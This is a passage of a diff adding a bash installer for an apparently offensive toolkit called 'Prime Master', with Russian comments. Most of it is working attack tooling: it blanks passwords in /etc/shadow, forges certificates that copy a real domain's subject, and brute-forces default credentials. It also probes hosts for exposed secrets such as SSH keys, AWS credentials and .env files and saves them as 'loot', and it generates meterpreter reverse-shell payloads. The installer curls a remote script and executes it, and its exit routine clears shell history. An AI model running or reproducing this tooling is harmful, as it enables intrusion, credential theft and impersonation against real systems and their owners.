+                        TARGET_USER="${USERS_LIST[$U_IDX]}"
+                        
+                        if [ -n "$TARGET_USER" ]; then
+                            if [ "$OS_TYPE" == "Linux" ]; then
+                                sed -i "s/^$TARGET_USER:[^:]*:/$TARGET_USER::/" /etc/shadow
+                                echo -e "\e[1;32m[SUCCESS] Password cleared for $TARGET_USER\e[0m"
+                            else
+                                read -p "New Pass: " M_PASS
+                                sudo dscl . -passwd /Users/"$TARGET_USER" "$M_PASS"
+                                echo -e "\e[1;32m[SUCCESS] Password updated for $TARGET_USER\e[0m"
+                            fi
+                        fi
+                    fi
+                else
+                    echo -e "\e[1;31m[ERR] No Windows SAM or supported OS found.\e[0m"
+                fi
+            fi
+            ;;
+        *) return ;;
+    esac
+    read -p "Press [ENTER] to return..."
+}
+
+
+run_cert_analyzer() {
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "       PRIME MASTER: CERTIFICATE ANALYZER         "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -n "Enter Path to File or Domain (e.g. google.com): "
+    read TARGET
+
+    if [ -z "$TARGET" ]; then
+        echo -e "\e[1;31m[!] No target specified.\e[0m"
+        sleep 2
+        return
+    fi
+
+    echo -e "\n\e[1;34m[*] Extracting Certificate Data...\e[0m\n"
+
+    # Проверка: это файл или домен?
+    if [ -f "$TARGET" ]; then
+        # Анализ локального файла
+        openssl x509 -in "$TARGET" -text -noout | grep -E "Subject:|Issuer:|Not Before:|Not After:|Public-Key:" | sed 's/^[[:space:]]*//'
+    else
+        # Анализ удаленного домена через сетевой запрос
+        timeout 5 openssl s_client -connect "${TARGET}:443" -servername "$TARGET" </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates | sed 's/^/    /'
+    fi
+
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo -n "Press [ENTER] to return to menu..."
+    read -r
+}
+
+
+run_cert_creator() {
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "       PRIME MASTER: CERTIFICATE CREATOR          "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    echo -n "Enter Domain or Name (e.g. prime.local): "
+    read DOMAIN
+    if [ -z "$DOMAIN" ]; then DOMAIN="prime.local"; fi
+
+    echo -n "Enter Country Code (2 letters, e.g. US): "
+    read COUNTRY
+    if [ -z "$COUNTRY" ]; then COUNTRY="US"; fi
+
+    echo -e "\n\e[1;34m[*] Generating 2048-bit RSA Key and Certificate...\e[0m"
+
+    # Генерация без лишних вопросов (Self-Signed)
+    # Сохраняем в текущую папку для удобства
+    openssl req -x509 -newkey rsa:2048 -nodes \
+        -keyout "${DOMAIN}.key" \
+        -out "${DOMAIN}.crt" \
+        -days 365 \
+        -subj "/C=${COUNTRY}/ST=None/L=None/O=PrimeMaster/OU=Dev/CN=${DOMAIN}" 2>/dev/null
+
+    if [ $? -eq 0 ]; then
+        echo -e "\n\e[1;32m[SUCCESS]\e[0m Certificate created successfully!"
+        echo -e "\e[1;33mFiles saved:\e[0m"
+        echo -e "    Key:  ${DOMAIN}.key"
+        echo -e "    Cert: ${DOMAIN}.crt"
+    else
+        echo -e "\n\e[1;31m[ERROR]\e[0m Failed to generate certificate. Check if OpenSSL is installed."
+    fi
+
+    echo -e "\n\e[1;32m--------------------------------------------------\e[0m"
+    echo -n "Press [ENTER] to return to menu..."
+    read -r
+}
+
+run_pwd_gen() {
+    clear
+    echo -e "\e[1;33m--- PRIME PASSWORD GENERATOR ---\e[0m"
+    read -p "Enter Length: " P_LEN
+    [[ -z "$P_LEN" || ! "$P_LEN" =~ ^[0-9]+$ ]] && P_LEN=16
+
+    # Используем чистый набор символов без конфликтующих скобок
+    # Символы - и _ ставим в конец, чтобы tr не думал, что это диапазон
+    RESULT=$(cat /dev/urandom | tr -dc 'A-Za-z0-9!@#$%^&*()_+=' | head -c "$P_LEN")
+    
+    echo -e "\n\e[1;32m[+] Generated:\e[0m $RESULT"
+    echo "--------------------------------"
+    
+    read -p "Hash it with Bcrypt? (y/n): " h_choice
+    if [[ "$h_choice" == "y" ]]; then
+        # Проверка наличия mkpasswd (пакет whois)
+        if command -v mkpasswd >/dev/null; then
+            echo -n "$RESULT" | mkpasswd -m bcrypt -s
+        else
+            echo "Error: whois package (mkpasswd) not installed."
+        fi
+    fi
+    pause
+}
+
+
+
+
+   run_cert_forge() {
+    clear
+    echo -e "\e[1;32m--------------------------------------------------"
+    echo "         PRIME MASTER: CERTIFICATE FORGE          "
+    echo "--------------------------------------------------\e[0m"
+    
+    read -p "Enter Domain to spoof (e.g. google.com): " S_DOMAIN
+    if [ -z "$S_DOMAIN" ]; then echo "No domain."; sleep 1; return; fi
+
+    echo -e "\e[1;34m[*] Fetching metadata for $S_DOMAIN...\e[0m"
+    
+    # Исправленная линия 1032: используем более простой способ забора Subject
+    # Без сложных sed-конструкций внутри переменной
+    RAW_INFO=$(timeout 5 openssl s_client -connect "${S_DOMAIN}:443" -servername "$S_DOMAIN" </dev/null 2>/dev/null | openssl x509 -noout -subject)
+    
+    if [ -z "$RAW_INFO" ]; then
+        echo -e "\e[1;31m[!] Failed to get certificate info.\e[0m"
+        pause; return
+    fi
+
+    # Очищаем только префикс 'subject='
+    ORIG_SUBJ=$(echo "$RAW_INFO" | sed 's/^subject=//')
+
+    echo -e "\e[1;32m[+] Original Subject:\e[0m $ORIG_SUBJ"
+    echo -e "\e[1;33m[*] Generating Fake Certificate...\e[0m"
+    
+    # Генерация ключа и сертификата
+    openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 \
+        -subj "$ORIG_SUBJ" \
+        -keyout "/root/${S_DOMAIN}.key" \
+        -out "/root/${S_DOMAIN}.crt" 2>/dev/null
+
+    echo "--------------------------------------------------"
+    echo -e "[SUCCESS] Files created: /root/${S_DOMAIN}.key /root/${S_DOMAIN}.crt"
+    pause
+}
+
+
+# 1. Единый Движок Эксплуатации (Ручной + Авто режим)
+run_prime_exploiter_v4() {
+    # Если аргумент передан ($1), используем его. Если нет — спрашиваем.
+    if [ -n "$1" ]; then
+        TARGET="$1"
+    else
+        clear
+        echo -e "\e[1;31m--------------------------------------------------"
+        echo "    PRIME ULTIMATE EXPLOITER v4 (LIVE ENGINE)     "
+        echo "--------------------------------------------------\e[0m"
+        echo -n "Enter Target (IP or Domain): "
+        read TARGET
+    fi
+
+    [ -z "$TARGET" ] && return
+
+    UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    
+    # --- Ультимативные списки (Векторы и Креды) ---
+    V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" "/config.xml:root" "/dev/mtd0:ELF" "/etc/config/network:config interface" "/sysconf.cgi:admin_password" "/home/httpd/html/config/exportsettings.conf:Password" "/etc/RT2860_default_vlan:Password" "/.env:DB_PASSWORD" "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE" "/.docker/config.json:auths" "/.npmrc:_auth" "/.bash_history:ssh " "/.kube/config:client-certificate-data" "/wp-config.php.bak:DB_PASSWORD" "/wp-config.php.swp:DB_PASSWORD" "/wp-content/debug.log:WP_User" "/configuration.php:public $password" "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password" "/etc/shadow:root:" "/etc/passwd:root:x" "/admin/.htpasswd:admin:" "/.history:password")
+    C_LIST=("admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" "dbadmin:dbadmin")
+
+    for proto in "http" "https"; do
+        URL="${proto}://${TARGET}/"
+        RESP=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1)
+        CODE=$(echo "$RESP" | grep -oE '[0-9]{3}' | head -n1)
+        CODE=${CODE:-000}
+
+        if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
+            echo -e "    \e[1;32m[+]\e[0m $URL [Status: $CODE]"
+            
+            # Векторы
+            for vec in "${V_LIST[@]}"; do
+                V_PATH=$(echo "$vec" | cut -d':' -f1); V_KEY=$(echo "$vec" | cut -d':' -f2)
+                if curl -sL -k -A "$UA" --max-time 3 "${proto}://${TARGET}${V_PATH}" 2>/dev/null | grep -q "$V_KEY"; then
+                    echo -e "    \e[1;31m[!!!] VULN FOUND: $V_PATH\e[0m"
+                    echo "[EXPL] ${TARGET}${V_PATH} | $V_KEY" >> /root/prime_loot_live.txt
+                fi
+            done
+
+            # Брут
+            for pair in "${C_LIST[@]}"; do
+                U=$(echo "$pair" | cut -d':' -f1); P=$(echo "$pair" | cut -d':' -f2)
+                if [[ $(curl -sL -k -u "$U:$P" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 2 "$URL") == "200" ]]; then
+                    echo -e "    \e[1;32m[!!!] AUTH MATCH: $U:$P\e[0m"
+                    echo "[AUTH] $U:$P @ $TARGET" >> /root/prime_loot_live.txt
+                    break
+                fi
+            done
+        fi
+    done
+
+    # В ручном режиме ждем нажатия кнопки, в авто — идем дальше
+    if [ -z "$1" ]; then
+        echo -e "\n\e[1;32mDone. Loot saved.\e[0m"
+        read -p "Press [ENTER]"
+    fi
+}
+
+# 2. Интеллектуальный Эвристический Сканер
+run_heuristic_scanner_v2() {
+    clear
+    echo -e "\e[1;35m"
+    echo "--------------------------------------------------"
+    echo "   PRIME MASTER: HEURISTIC AUTONOMOUS SCANNER     "
+    echo "--------------------------------------------------\e[0m"
+    echo -n "ENTER TARGET SCOPE (IP/CIDR/Domain): "
+    read SCOPE
+    [ -z "$SCOPE" ] && return
+
+    echo -e "\n\e[1;34m[*] Phase 1: Stealth Enumeration...\e[0m"
+    # Быстрый поиск живых хостов без лишнего шума
+    nmap -n -sn --host-timeout 500ms "$SCOPE" | grep "report for" | cut -d' ' -f5 > /tmp/.prime_nodes
+
+    NODE_COUNT=$(wc -l < /tmp/.prime_nodes)
+    if [ "$NODE_COUNT" -eq 0 ]; then
+        echo -e "\e[1;31m[!] No targets found.\e[0m"; sleep 2; return
+    fi
+
+    echo -e "\e[1;32m[+]\e[0m Found $NODE_COUNT nodes. \e[1;7m STARTING EXTRACTION... \e[0m\n"
+
+    while read -r NODE; do
+        echo -e "\e[1;35m>>> TARGET:\e[0m \e[1;37m$NODE\e[0m"
+        # Вызываем эксплойтер в авто-режиме
+        run_prime_exploiter_v4 "$NODE"
+        echo -e "\e[1;30m--------------------------------------------------\e[0m"
+    done < /tmp/.prime_nodes
+
+    rm -f /tmp/.prime_nodes
+    echo -e "\n\e[1;32m[+++] SCAN COMPLETE. Loot: /root/prime_loot_live.txt\e[0m"
+    read -p "Press [ENTER]"
+}
+
+
+run_view_loot() {
+    clear
+    echo -e "\e[1;32m"
+    echo "--------------------------------------------------"
+    echo "    PRIME MASTER: DATA HARVESTER - LOOT VIEW      "
+    echo "--------------------------------------------------"
+    echo -e "\e[0m"
+
+    # Список файлов для проверки
+    LOOT_FILES=("/root/prime_loot_live.txt" "/root/prime_found_keys.txt")
+    FOUND_ANY=false
+
+    for file in "${LOOT_FILES[@]}"; do
+        if [[ -s "$file" ]]; then
+            FOUND_ANY=true
+            echo -e "\e[1;34m>>> DATA FROM: $file\e[0m"
+            echo -e "\e[1;30m--------------------------------------------------\e[0m"
+            # Используем column для выравнивания, если данных много
+            cat "$file" | sed 's/|/ | /g' | column -t -s '|' 2>/dev/null || cat "$file"
+            echo -e "\e[1;30m--------------------------------------------------\e[0m\n"
+        fi
+    done
+
+    if [ "$FOUND_ANY" = false ]; then
+        echo -e "\e[1;31m[!] No harvested data found yet.\e[0m"
+        echo "Try running the Scanner or Exploiter first."
+    fi
+
+    echo -e "\n\e[1;33m[ PRESS ENTER TO RETURN TO MAIN MENU ]\e[0m"
+    read -r
+}
+
+
+
+
+# --- Модули: EXPLOIT HUB (Пункт 6) ---
+run_exploit_hub() {
+    local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
+    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
+    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
+}
+
+run_pc_control() {
+    local pc_names="Payload_Generator Password_Stealer Post-Exploit_Menu"
+    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
+    prime_dynamic_controller "PC CONTROL & AUDIT" "$pc_names" "$pc_funcs"
+}
+
+pc_gen_payload() { read -p "LHOST: " lh; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe; pause; }
+
+# --- Системные функции ---
+run_sqlmap() { read -p "URL: " u; [ -n "$u" ] && sqlmap -u "$u" --batch --random-agent; pause; }
+run_iban_scan() { read -p "IBAN: " i; python3 /root/iban_check.py "$(echo $i | tr -d ' ')"; pause; }
+run_phishing() { [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh; }
+run_ghost_scan() { read -p "IP: " t; nmap -F "$t"; pause; }
+run_repair() { repair; echo -e "${G}[+] Cleaned${NC}"; pause; }
+run_system_info() { clear; get_stats; pause; }
+
+run_servers() {
+    local s_names="AV-Scanner Share-File Upload-Inbound"
+    local s_funcs="run_av_srv run_share_srv run_upload_srv"
+    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
+}
+
+run_av_srv() { python3 /root/av_server.py; }
+run_share_srv() { python3 /root/share_server.py; }
+run_upload_srv() { python3 /root/upload_server.py; }
+
+update_prime() {
+    echo -e "${B}[*] Updating...${NC}"
+    curl -L https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh -o /root/install_all.sh
+    chmod +x /root/install_all.sh && exec /root/install_all.sh
+}
+
+pause() { read -p "Press Enter..." dummy; }
+
+exit_script() { history -c; exit 0; }
+
+
+# --- ГЛАВНОЕ МЕНЮ (v31.5: + PC_RECOVERY_ULTIMATE) ---
+run_main_menu() {
+    # 1. Список имен (Визуальные названия)
+    # Добавлен PC_RECOVERY (Forensic + Pass Reset)
+    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN/RIB_SCAN PWD_GEN CERT_FORGE CERTIF_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB MANUAL_INSTALL REPAIR UPDATE_CORE EXIT"
+    
+    # 2. Список функций (Строгое соответствие порядку имен)
+    local main_funcs=run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers install_manual_tools run_repair update_prime exit_script"
+    
+    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
+}
+
+
+# --- Точка входа ---
+repair
+run_main_menu
+EOF
+)
+
+    # Применяем версию и записываем
+    code="${code//\{\{V_NUM\}\}/$v_num}"
+    smart_cat "$target_file" "$code"
+}
+
+
+update_module "/root/av_server.py" "1.7" generate_av_server_code "AV-Scanner"
+update_module "/root/iban_check.py" "1.8" generate_iban_code "IBAN/RIB Checker"
+update_module "/root/share_server.py" "1.2" generate_share_server_code "File-Share"
+update_module "/root/upload_server.py"  "1.2" generate_upload_server_code  "Inbound-Drop-Box"
+
+# --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
+update_module "/root/launcher.sh" "33.5" generate_launcher_code "Prime-Launcher"
+chmod +x /root/launcher.sh
+ln -sf /root/launcher.sh /usr/local/bin/launcher
+repair_and_clean
+create_repair_script
+setup_cron
+echo -e "\n${G}[✔] PRIME v$CURRENT_VERSION ПОЛНЫЙ ОРИГИНАЛ ВОССТАНОВЛЕН. Введи: launcher${NC}"
